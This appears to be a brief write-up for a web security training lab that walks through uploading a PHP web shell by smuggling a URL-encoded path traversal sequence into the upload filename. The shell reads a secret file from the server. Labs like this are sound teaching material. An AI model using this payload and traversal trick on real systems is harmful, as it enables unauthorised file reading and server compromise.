# 3. Web shell upload via path traversal

1. Create a file called `shell.php` which contains the following code `<?php echo file_get_contents(‘/home/carlos/secret’); ?>`
2. Log in to your Account with `wiener:peter`
3. Upload `shell.php` , capture the Request, and change the value of the filename from shell.php to `%2e%2e%2f/shell.php` and send the request.
4. Now, go to My-Account, right-click on the avatar, click Open in a new tab, change the location to /files/avatars/../shell.php, and send the request.
5. if 4th not working then → change /files/avatars/../shell.php  —> files/shell.php
6. If it is not working, then send it to Burpsuite, and you’ll see the secret code.
7. Copy the code and paste it in the solution to solve the Lab.